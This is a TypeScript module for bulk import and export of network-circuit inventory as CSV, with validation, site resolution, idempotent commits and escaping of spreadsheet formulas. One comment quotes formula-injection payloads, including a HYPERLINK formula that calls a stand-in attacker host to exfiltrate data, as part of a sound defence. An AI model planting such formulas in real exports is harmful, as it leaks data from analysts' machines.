import { z } from "zod";
import type { Prisma, PrismaClient } from "@prisma/client";
import { prisma } from "./prisma.js";

const connectivityEnum = z.enum(["DIA", "BROADBAND", "SATELLITE", "CELLULAR_4G_5G"]);
const siteLocalContactSlotEnum = z.enum(["PRIMARY", "SECONDARY"]);

export const circuitImportRowSchema = z.object({
  idempotencyKey: z.string().uuid(),
  siteId: z.string().nullable().optional(),
  siteName: z.string().nullable().optional(),
  merakiNetworkId: z.string().nullable().optional(),
  connectivityKind: connectivityEnum,
  providerName: z.string().min(1).max(200),
  carrierCircuitId: z.string().min(1).max(200),
  speedPresetId: z
    .preprocess((v) => (v === "" || v === null ? undefined : v), z.string().min(1).optional()),
  customSpeedLabel: z.string().max(200).nullable().optional(),
  isSynchronous: z.boolean().optional(),
  siteLocalContactSlot: z.union([siteLocalContactSlotEnum, z.null()]).optional(),
  merakiInterface: z.string().min(1).max(40),
  merakiApplianceSerial: z.string().max(64).nullable().optional(),
  notes: z.string().max(2000).nullable().optional(),
  displayOrder: z.number().int().optional(),
  /** Store-level contacts (Site); optional. Only non-empty values update the location on commit. */
  localContactPrimaryName: z.string().max(200).nullable().optional(),
  localContactPrimaryPhone: z.string().max(80).nullable().optional(),
  localContactPrimaryEmail: z.string().max(200).nullable().optional(),
  localContactSecondaryName: z.string().max(200).nullable().optional(),
  localContactSecondaryPhone: z.string().max(80).nullable().optional(),
  localContactSecondaryEmail: z.string().max(200).nullable().optional(),
});

export type CircuitImportRow = z.infer<typeof circuitImportRowSchema>;

export const importBodySchema = z.object({
  rows: z.array(circuitImportRowSchema).min(1).max(500),
});

export type CircuitImportBody = z.infer<typeof importBodySchema>;

/**
 * Loose shape check for the bulk-import endpoints.
 *
 * We intentionally avoid the strict `importBodySchema` at the route level because the per-row
 * validators ({@link validateCircuitImportRows} / {@link commitCircuitImportRows}) re-parse each
 * row individually and produce actionable per-row errors. Using the strict schema at the edge
 * would reject the entire batch with a generic "Invalid body" whenever a single row had a bad
 * value (e.g. missing provider_name), hiding which row/field was at fault.
 */
export const importBodyShapeSchema = z.object({
  rows: z.array(z.record(z.unknown())).min(1).max(500),
});

/** Must match the first line of `CIRCUIT_IMPORT_SAMPLE_CSV` and bulk-import column reference. */
export const CIRCUIT_IMPORT_CSV_HEADER =
  "site_name,site_id,meraki_network_id,connectivity_kind,provider_name,carrier_circuit_id,meraki_interface,speed_preset_id,custom_speed_label,is_synchronous,site_local_contact_slot,meraki_appliance_serial,notes,display_order,local_contact_primary_name,local_contact_primary_phone,local_contact_primary_email,local_contact_secondary_name,local_contact_secondary_phone,local_contact_secondary_email";

export const CIRCUIT_IMPORT_SAMPLE_CSV = `${CIRCUIT_IMPORT_CSV_HEADER}
Example Store,,,DIA,Example Carrier Inc,CKT-10001,wan1,,,true,,,Primary uplink,0,,,,,,
`;

/** Row shape for inventory export (matches `GET /api/circuits` include). */
export type CircuitInventoryExportRow = {
  connectivityKind: string;
  providerName: string;
  carrierCircuitId: string;
  speedPresetId: string | null;
  customSpeedLabel: string | null;
  isSynchronous: boolean;
  siteLocalContactSlot: "PRIMARY" | "SECONDARY" | null;
  merakiInterface: string;
  merakiApplianceSerial: string | null;
  notes: string | null;
  displayOrder: number;
  site: {
    id: string;
    name: string;
    merakiNetworkId: string | null;
    localContactPrimaryName: string | null;
    localContactPrimaryPhone: string | null;
    localContactPrimaryEmail: string | null;
    localContactSecondaryName: string | null;
    localContactSecondaryPhone: string | null;
    localContactSecondaryEmail: string | null;
  };
};

/**
 * Characters Excel / Google Sheets / LibreOffice Calc treat as the start of a formula. A cell
 * beginning with any of these is evaluated as code when the CSV is opened, which lets an
 * attacker who can influence exported content (e.g. a site name, a notes field, a provider
 * name) run arbitrary spreadsheet expressions — `=HYPERLINK("http://attacker/...&"...)`,
 * `=WEBSERVICE(...)`, DDE payloads, etc. — on the analyst's machine.
 *
 * We neutralize the class by prefixing offending cells with a single apostrophe, which
 * spreadsheet apps interpret as "treat this cell as a literal text" without altering the
 * displayed value in ways a non-technical viewer would notice. Tab (0x09) and carriage
 * return (0x0D) are included because they're also documented formula triggers in Excel.
 */
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

export function escapeCsvCell(value: string | number | boolean | null | undefined): string {
  if (value === null || value === undefined) {
    return "";
  }
  let s = typeof value === "string" ? value : String(value);
  if (FORMULA_TRIGGERS.test(s)) {
    s = `'${s}`;
  }
  if (/[",\r\n]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

export function formatCircuitInventoryCsv(rows: CircuitInventoryExportRow[]): string {
  const lines: string[] = [CIRCUIT_IMPORT_CSV_HEADER];
  for (const r of rows) {
    const cells = [
      escapeCsvCell(r.site.name),
      escapeCsvCell(r.site.id),
      escapeCsvCell(r.site.merakiNetworkId ?? ""),
      escapeCsvCell(r.connectivityKind),
      escapeCsvCell(r.providerName),
      escapeCsvCell(r.carrierCircuitId),
      escapeCsvCell(r.merakiInterface),
      escapeCsvCell(r.speedPresetId ?? ""),
      escapeCsvCell(r.customSpeedLabel ?? ""),
      escapeCsvCell(r.isSynchronous),
      escapeCsvCell(r.siteLocalContactSlot ?? ""),
      escapeCsvCell(r.merakiApplianceSerial ?? ""),
      escapeCsvCell(r.notes ?? ""),
      escapeCsvCell(r.displayOrder),
      escapeCsvCell(r.site.localContactPrimaryName ?? ""),
      escapeCsvCell(r.site.localContactPrimaryPhone ?? ""),
      escapeCsvCell(r.site.localContactPrimaryEmail ?? ""),
      escapeCsvCell(r.site.localContactSecondaryName ?? ""),
      escapeCsvCell(r.site.localContactSecondaryPhone ?? ""),
      escapeCsvCell(r.site.localContactSecondaryEmail ?? ""),
    ];
    lines.push(cells.join(","));
  }
  return `${lines.join("\r\n")}\r\n`;
}

/** Validation for optional site local-contact fields on import (mirrors Stores tab limits). */
export function validateSiteLocalContactImportFields(row: CircuitImportRow): string[] {
  const err: string[] = [];
  const checkLen = (label: string, v: string | null | undefined, max: number) => {
    if (v != null && v.trim().length > max) {
      err.push(`${label} exceeds ${max} characters`);
    }
  };
  checkLen("local_contact_primary_name", row.localContactPrimaryName ?? undefined, 200);
  checkLen("local_contact_primary_phone", row.localContactPrimaryPhone ?? undefined, 80);
  checkLen("local_contact_primary_email", row.localContactPrimaryEmail ?? undefined, 200);
  checkLen("local_contact_secondary_name", row.localContactSecondaryName ?? undefined, 200);
  checkLen("local_contact_secondary_phone", row.localContactSecondaryPhone ?? undefined, 80);
  checkLen("local_contact_secondary_email", row.localContactSecondaryEmail ?? undefined, 200);
  for (const [label, v] of [
    ["local_contact_primary_email", row.localContactPrimaryEmail],
    ["local_contact_secondary_email", row.localContactSecondaryEmail],
  ] as const) {
    const t = v?.trim();
    if (t && !z.string().email().safeParse(t).success) {
      err.push(`${label} is not a valid email address`);
    }
  }
  return err;
}

function prismaSiteContactPatchFromImportRow(row: CircuitImportRow): Prisma.SiteUpdateInput | null {
  const data: Prisma.SiteUpdateInput = {};
  if (row.localContactPrimaryName !== undefined) {
    data.localContactPrimaryName = row.localContactPrimaryName?.trim() ? row.localContactPrimaryName.trim() : null;
  }
  if (row.localContactPrimaryPhone !== undefined) {
    data.localContactPrimaryPhone = row.localContactPrimaryPhone?.trim() ? row.localContactPrimaryPhone.trim() : null;
  }
  if (row.localContactPrimaryEmail !== undefined) {
    data.localContactPrimaryEmail = row.localContactPrimaryEmail?.trim() ? row.localContactPrimaryEmail.trim() : null;
  }
  if (row.localContactSecondaryName !== undefined) {
    data.localContactSecondaryName = row.localContactSecondaryName?.trim() ? row.localContactSecondaryName.trim() : null;
  }
  if (row.localContactSecondaryPhone !== undefined) {
    data.localContactSecondaryPhone = row.localContactSecondaryPhone?.trim() ? row.localContactSecondaryPhone.trim() : null;
  }
  if (row.localContactSecondaryEmail !== undefined) {
    data.localContactSecondaryEmail = row.localContactSecondaryEmail?.trim() ? row.localContactSecondaryEmail.trim() : null;
  }
  return Object.keys(data).length > 0 ? data : null;
}

function normalizeRowStrings(row: Record<string, unknown>): Record<string, unknown> {
  const out: Record<string, unknown> = { ...row };
  for (const k of Object.keys(out)) {
    const v = out[k];
    if (typeof v === "string" && v.trim() === "") {
      out[k] = undefined;
    }
  }
  return out;
}

export async function resolveSiteIdForImport(
  db: PrismaClient,
  input: { siteId?: string | null; siteName?: string | null; merakiNetworkId?: string | null },
): Promise<{ ok: true; siteId: string } | { ok: false; error: string }> {
  const sid = input.siteId?.trim();
  if (sid) {
    const s = await db.site.findUnique({ where: { id: sid } });
    if (!s) {
      return { ok: false, error: "Unknown site_id" };
    }
    return { ok: true, siteId: s.id };
  }
  const mid = input.merakiNetworkId?.trim();
  if (mid) {
    const matches = await db.site.findMany({ where: { merakiNetworkId: mid } });
    if (matches.length === 0) {
      return { ok: false, error: "No site found for meraki_network_id" };
    }
    if (matches.length > 1) {
      return { ok: false, error: "Multiple sites share this meraki_network_id; use site_id" };
    }
    return { ok: true, siteId: matches[0].id };
  }
  const name = input.siteName?.trim();
  if (name) {
    const matches = await db.site.findMany({
      where: { name: { equals: name, mode: "insensitive" } },
    });
    if (matches.length === 0) {
      return { ok: false, error: "No site matches site_name" };
    }
    if (matches.length > 1) {
      return { ok: false, error: "Multiple sites match site_name; use site_id or meraki_network_id" };
    }
    return { ok: true, siteId: matches[0].id };
  }
  return { ok: false, error: "Provide site_id, site_name, or meraki_network_id" };
}

async function buildCircuitData(
  db: PrismaClient,
  row: CircuitImportRow,
  resolvedSiteId: string,
): Promise<{
  ok: true;
  data: {
    siteId: string;
    connectivityKind: CircuitImportRow["connectivityKind"];
    providerName: string;
    carrierCircuitId: string;
    speedPresetId: string | null;
    customSpeedLabel: string | null;
    isSynchronous: boolean;
    siteLocalContactSlot: "PRIMARY" | "SECONDARY" | null;
    merakiInterface: string;
    merakiApplianceSerial: string | null;
    notes: string | null;
    displayOrder: number;
  };
} | { ok: false; error: string }> {
  if (row.speedPresetId?.trim()) {
    const preset = await db.circuitSpeedPreset.findUnique({ where: { id: row.speedPresetId.trim() } });
    if (!preset) {
      return { ok: false, error: "Unknown speed_preset_id" };
    }
  }
  const iface = row.merakiInterface.trim();
  const existing = await db.circuit.findFirst({
    where: { siteId: resolvedSiteId, merakiInterface: iface },
  });
  if (existing) {
    return {
      ok: false,
      error: `A circuit already exists for this location with Meraki interface "${iface}" (unique per site)`,
    };
  }
  return {
    ok: true,
    data: {
      siteId: resolvedSiteId,
      connectivityKind: row.connectivityKind,
      providerName: row.providerName.trim(),
      carrierCircuitId: row.carrierCircuitId.trim(),
      speedPresetId: row.speedPresetId?.trim() ? row.speedPresetId.trim() : null,
      customSpeedLabel: row.customSpeedLabel?.trim() ? row.customSpeedLabel.trim() : null,
      isSynchronous: row.isSynchronous ?? true,
      siteLocalContactSlot: row.siteLocalContactSlot ?? null,
      merakiInterface: iface,
      merakiApplianceSerial: row.merakiApplianceSerial?.trim() ? row.merakiApplianceSerial.trim() : null,
      notes: row.notes?.trim() ? row.notes.trim() : null,
      displayOrder: row.displayOrder ?? 0,
    },
  };
}

export async function validateCircuitImportRows(
  rows: ReadonlyArray<Record<string, unknown>>,
): Promise<{
  rows: Array<{ index: number; ok: boolean; errors?: string[]; resolvedSiteId?: string }>;
}> {
  const results: Array<{ index: number; ok: boolean; errors?: string[]; resolvedSiteId?: string }> = [];
  const batchKeys = new Set<string>();
  const seenKeys = new Set<string>();

  for (let i = 0; i < rows.length; i++) {
    const row = rows[i];
    const errors: string[] = [];
    const parsed = circuitImportRowSchema.safeParse(normalizeRowStrings(row));
    if (!parsed.success) {
      errors.push(...parsed.error.flatten().formErrors);
      const fe = parsed.error.flatten().fieldErrors;
      for (const [fieldName, msgs] of Object.entries(fe)) {
        if (msgs) {
          for (const m of msgs) {
            errors.push(`${fieldName}: ${m}`);
          }
        }
      }
      results.push({ index: i, ok: false, errors });
      continue;
    }
    const r = parsed.data;
    if (seenKeys.has(r.idempotencyKey)) {
      errors.push("Duplicate idempotency_key in this batch");
    }
    seenKeys.add(r.idempotencyKey);

    const siteRes = await resolveSiteIdForImport(prisma, {
      siteId: r.siteId,
      siteName: r.siteName,
      merakiNetworkId: r.merakiNetworkId,
    });
    if (!siteRes.ok) {
      errors.push(siteRes.error);
      results.push({ index: i, ok: false, errors });
      continue;
    }
    const pairKey = `${siteRes.siteId}\t${r.merakiInterface.trim()}`;
    if (batchKeys.has(pairKey)) {
      errors.push("Duplicate (site, meraki_interface) in this batch");
    }
    batchKeys.add(pairKey);

    const built = await buildCircuitData(prisma, r, siteRes.siteId);
    if (!built.ok) {
      errors.push(built.error);
      results.push({ index: i, ok: false, errors });
      continue;
    }

    const contactErrs = validateSiteLocalContactImportFields(r);
    if (contactErrs.length > 0) {
      errors.push(...contactErrs);
      results.push({ index: i, ok: false, errors });
      continue;
    }

    results.push({ index: i, ok: true, resolvedSiteId: siteRes.siteId });
  }

  return { rows: results };
}

export async function commitCircuitImportRows(
  rows: ReadonlyArray<Record<string, unknown>>,
): Promise<{
  created: number;
  skipped: number;
  failed: number;
  results: Array<{
    index: number;
    ok: boolean;
    idempotencyKey: string;
    circuitId?: string;
    skipped?: boolean;
    error?: string;
  }>;
}> {
  const results: Array<{
    index: number;
    ok: boolean;
    idempotencyKey: string;
    circuitId?: string;
    skipped?: boolean;
    error?: string;
  }> = [];
  let created = 0;
  let skipped = 0;
  let failed = 0;

  const batchKeys = new Set<string>();
  const seenKeys = new Set<string>();

  for (let i = 0; i < rows.length; i++) {
    const row = rows[i];
    const parsed = circuitImportRowSchema.safeParse(normalizeRowStrings(row));
    if (!parsed.success) {
      failed += 1;
      const fe = parsed.error.flatten().fieldErrors;
      const details: string[] = [...parsed.error.flatten().formErrors];
      for (const [fieldName, msgs] of Object.entries(fe)) {
        if (msgs) {
          for (const m of msgs) {
            details.push(`${fieldName}: ${m}`);
          }
        }
      }
      results.push({
        index: i,
        ok: false,
        idempotencyKey: typeof row.idempotencyKey === "string" ? row.idempotencyKey : "",
        error: details.length > 0 ? details.join("; ") : "Invalid row",
      });
      continue;
    }
    const r = parsed.data;

    const existingIdem = await prisma.circuitImportIdempotency.findUnique({
      where: { idempotencyKey: r.idempotencyKey },
    });
    if (existingIdem) {
      skipped += 1;
      results.push({
        index: i,
        ok: true,
        idempotencyKey: r.idempotencyKey,
        circuitId: existingIdem.circuitId,
        skipped: true,
      });
      continue;
    }

    if (seenKeys.has(r.idempotencyKey)) {
      failed += 1;
      results.push({
        index: i,
        ok: false,
        idempotencyKey: r.idempotencyKey,
        error: "Duplicate idempotency_key in this batch",
      });
      continue;
    }
    seenKeys.add(r.idempotencyKey);

    const siteRes = await resolveSiteIdForImport(prisma, {
      siteId: r.siteId,
      siteName: r.siteName,
      merakiNetworkId: r.merakiNetworkId,
    });
    if (!siteRes.ok) {
      failed += 1;
      results.push({
        index: i,
        ok: false,
        idempotencyKey: r.idempotencyKey,
        error: siteRes.error,
      });
      continue;
    }

    const pairKey = `${siteRes.siteId}\t${r.merakiInterface.trim()}`;
    if (batchKeys.has(pairKey)) {
      failed += 1;
      results.push({
        index: i,
        ok: false,
        idempotencyKey: r.idempotencyKey,
        error: "Duplicate (site, meraki_interface) in this batch",
      });
      continue;
    }
    batchKeys.add(pairKey);

    const built = await buildCircuitData(prisma, r, siteRes.siteId);
    if (!built.ok) {
      failed += 1;
      results.push({
        index: i,
        ok: false,
        idempotencyKey: r.idempotencyKey,
        error: built.error,
      });
      continue;
    }

    const contactErrs = validateSiteLocalContactImportFields(r);
    if (contactErrs.length > 0) {
      failed += 1;
      results.push({
        index: i,
        ok: false,
        idempotencyKey: r.idempotencyKey,
        error: contactErrs.join("; "),
      });
      continue;
    }

    try {
      const circuit = await prisma.$transaction(async (tx) => {
        const contactPatch = prismaSiteContactPatchFromImportRow(r);
        if (contactPatch) {
          await tx.site.update({
            where: { id: siteRes.siteId },
            data: contactPatch,
          });
        }
        const c = await tx.circuit.create({
          data: built.data,
        });
        await tx.circuitImportIdempotency.create({
          data: {
            idempotencyKey: r.idempotencyKey,
            circuitId: c.id,
          },
        });
        return c;
      });
      created += 1;
      results.push({
        index: i,
        ok: true,
        idempotencyKey: r.idempotencyKey,
        circuitId: circuit.id,
      });
    } catch (e) {
      failed += 1;
      const msg = e instanceof Error ? e.message : "Create failed";
      results.push({
        index: i,
        ok: false,
        idempotencyKey: r.idempotencyKey,
        error: msg,
      });
    }
  }

  return { created, skipped, failed, results };
}
